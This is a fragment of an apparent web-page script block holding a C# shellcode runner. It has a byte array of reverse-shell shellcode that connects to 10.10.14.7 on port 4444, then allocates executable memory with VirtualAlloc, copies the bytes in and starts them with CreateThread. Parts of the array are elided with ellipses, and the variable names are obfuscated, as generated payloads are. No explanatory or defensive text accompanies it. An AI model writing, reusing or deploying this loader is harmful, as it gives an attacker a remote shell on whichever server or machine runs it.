...
0x68,0x0a,0x0a,0x0e,0x07,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr tDz9 = VirtualAlloc(IntPtr.Zero,(UIntPtr)z_rbIVmbNS.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(z_rbIVmbNS,0,tDz9,z_rbIVmbNS.Length);
        IntPtr fmMsXLHo = IntPtr.Zero;
        IntPtr mOEjH8xBYowm = CreateThread(IntPtr.Zero,UIntPtr.Zero,tDz9,IntPtr.Zero,0,ref fmMsXLHo);
    }
</script>
